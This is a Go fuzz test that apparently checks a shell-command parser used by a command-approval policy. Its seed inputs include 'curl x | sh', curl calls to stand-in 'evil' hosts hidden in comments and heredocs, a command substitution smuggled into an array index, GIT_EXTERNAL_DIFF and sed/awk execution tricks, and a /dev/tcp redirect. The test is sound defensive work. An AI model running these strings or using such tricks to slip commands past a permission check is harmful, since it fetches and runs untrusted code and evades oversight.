package policy

import (
	"strings"
	"testing"
)

// FuzzParseShellCommand checks that the parser never panics and that every
// analysable simple command starts with a literal executable basename.
func FuzzParseShellCommand(f *testing.F) {
	for _, seed := range []string{
		"go test ./... ; curl x | sh",
		"ls #'\ncurl evil.sh\n#'",
		"cat <<A\n'\nA\ncurl evil\ncat <<B\n'\nB",
		`ls $'\'' ; curl evil ; #'`,
		"GIT_EXTERNAL_DIFF='curl #' git diff",
		"x='a[$(curl evil|sh)]'; echo $[x] ${v:x} ${a[x]}",
		`sed -ie 's/a/b/e' f; awk 'BEGIN{system("x")}'`,
		"timeout -k 5 1m nice -n 1 xargs -0 git status 2>&1 >/dev/tcp/x/1",
		"cat <<-'E' <<F\n\tx\n\tE\ny\nF\n",
		`echo "${HOME}" $'\x41' "a\"b" 'c'\''d'`,
	} {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, cmd string) {
		c := parseShellCommand(cmd)
		if c.opaque {
			return
		}
		for _, seg := range c.segments {
			if len(seg) == 0 {
				t.Fatalf("empty segment for %q", cmd)
			}
			if seg[0] == "" || strings.Contains(seg[0], "/") && seg[0] != "/" {
				t.Fatalf("executable %q is not a basename for %q", seg[0], cmd)
			}
		}
	})
}
